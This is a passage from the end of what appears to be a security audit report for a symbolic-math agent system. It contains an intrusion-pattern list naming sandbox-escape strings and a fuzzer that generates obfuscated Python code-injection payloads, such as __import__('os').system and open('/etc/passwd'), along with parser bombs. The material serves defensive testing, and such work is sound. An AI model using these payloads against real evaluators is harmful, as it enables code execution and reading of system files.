        'range(1000000)', 'sum(' * 10
    ],
    'sandbox_escape': [
        'import os', 'import sys', 'import subprocess',
        'open(', 'socket.', 'urllib.'
    ],
    'privilege_escalation': [
        'admin/', 'system/', 'config/',
        'shutdown', 'terminate', 'kill'
    ]
}

def detect_attack_pattern(input_str: str) -> Optional[str]:
    """Detect known attack patterns in input."""
    for pattern_type, patterns in INTRUSION_PATTERNS.items():
        for pattern in patterns:
            if pattern in input_str:
                return pattern_type
    return None
```

---

## 9. Recommended Implementation Priorities

### Priority 1 - Critical (Implement Immediately)
1. **Enhanced Unicode validation** in `safe_parser.py`
2. **Operation-specific timeouts** in watchdog
3. **Constant-time pattern checking** to prevent timing attacks
4. **Error message sanitization** to prevent info disclosure

### Priority 2 - High (Next Sprint)
5. **Complexity estimation** before parsing
6. **Message authentication** in agent communication
7. **Stack trace sanitization** in production mode
8. **Enhanced sandbox restrictions** in `sandbox_evaluator.py`

### Priority 3 - Medium (Next Quarter)
9. **Intrusion detection system** integration
10. **Security event correlation** engine
11. **Automated penetration testing** framework
12. **Rate limiting** per agent/user

---

## 10. Security Testing Tools & Scripts

### 10.1 Automated Fuzzer

```python
# File: scripts/security_fuzzer.py

import random
import string
from typing import List

class SecurityFuzzer:
    """Automated security fuzzing tool."""

    def generate_malicious_payloads(self, count: int) -> List[str]:
        """Generate diverse malicious payloads."""
        payloads = []

        # Code injection variants
        for i in range(count // 5):
            payloads.append(self.mutate_injection_payload())

        # DOS variants
        for i in range(count // 5):
            payloads.append(self.mutate_dos_payload())

        # Parser bombs
        for i in range(count // 5):
            payloads.append(self.mutate_parser_bomb())

        # Random garbage
        for i in range(count // 5):
            payloads.append(self.generate_random_garbage())

        # Mixed attacks
        for i in range(count // 5):
            payloads.append(self.generate_mixed_attack())

        return payloads

    def mutate_injection_payload(self) -> str:
        """Mutate code injection payload."""
        base = "__import__('os').system('ls')"

        mutations = [
            lambda: base.replace('import', 'im' + 'port'),
            lambda: base.replace('__', '\x5f\x5f'),  # Unicode escape
            lambda: f"eval('{base}')",
            lambda: f"getattr(__builtins__, '{base}')",
        ]

        return random.choice(mutations)()

    def mutate_dos_payload(self) -> str:
        """Mutate DOS payload."""
        base_exprs = [
            "(x+1)**{exp}",
            "factorial({n})",
            "sin(" * 50 + "x" + ")" * 50,
        ]

        expr = random.choice(base_exprs)
        return expr.format(exp=random.randint(100, 10000), n=random.randint(100, 100000))

    def mutate_parser_bomb(self) -> str:
        """Mutate parser bomb."""
        depth = random.randint(50, 500)
        return "(" * depth + "x" + ")" * depth

    def generate_random_garbage(self) -> str:
        """Generate random garbage input."""
        length = random.randint(10, 1000)
        chars = string.ascii_letters + string.digits + "()[]{}+-*/^=%!@#$%"
        return ''.join(random.choices(chars, k=length))

    def generate_mixed_attack(self) -> str:
        """Combine multiple attack vectors."""
        attacks = [
            "__import__('os')",
            "(x+1)**1000",
            "eval('1+1')",
            "open('/etc/passwd')"
        ]

        # Concatenate with valid math
        return " + ".join(random.sample(attacks, 2))

# Usage
if __name__ == "__main__":
    fuzzer = SecurityFuzzer()
    payloads = fuzzer.generate_malicious_payloads(1000)

    from symbo_agentic_reasoners.core.safe_parser import safe_parse

    blocked = 0
    for payload in payloads:
        try:
            safe_parse(payload)
        except:
            blocked += 1

    print(f"Blocked: {blocked}/{len(payloads)} ({blocked/len(payloads)*100:.1f}%)")
```

### 10.2 Security Audit Runner

```python
# File: scripts/run_security_audit.py

from src.system_agents.security_stress_tester import SecurityStressTester

def main():
    """Run comprehensive security audit."""
    tester = SecurityStressTester()

    print("="*80)
    print("SYMBO SECURITY AUDIT")
    print("="*80)

    # Run full audit
    report = tester.run_full_security_audit()

    # Generate reports
    markdown_report = report.generate_markdown()
    json_report = report.to_json()

    # Save reports
    with open('security_audit_report.md', 'w') as f:
        f.write(markdown_report)

    with open('security_audit_report.json', 'w') as f:
        f.write(json_report)

    # Print summary
    print(f"\nTests Run: {report.total_tests}")
    print(f"Passed: {report.passed_tests}")
    print(f"Failed: {report.failed_tests}")
    print(f"Vulnerabilities: {len(report.vulnerabilities)}")
    print(f"  Critical: {report.critical_count}")
    print(f"  High: {report.high_count}")
    print(f"  Medium: {report.medium_count}")
    print(f"  Low: {report.low_count}")

    # Exit code based on severity
    if report.critical_count > 0:
        return 2  # Critical issues
    elif report.high_count > 0:
        return 1  # High issues
    else:
        return 0  # Success

if __name__ == "__main__":
    exit(main())
```

---

## Conclusion

The Symbo Agentic Reasoners system has **strong foundational security** with multiple defense layers. Key recommendations:

1. **Maintain NO SYMPY philosophy** - Native engine reduces attack surface
2. **Enhance Unicode validation** - Prevent homoglyph attacks
3. **Implement operation-specific timeouts** - Prevent complexity DOS
4. **Sanitize error messages** - Prevent information disclosure
5. **Add message authentication** - Prevent agent impersonation
6. **Continuous security testing** - Use provided fuzzer and audit tools

The system's architecture with safe parsing, resource governance, timeout enforcement, and agent isolation provides robust security. Implementation of the additional recommendations will further harden the system against sophisticated attacks.
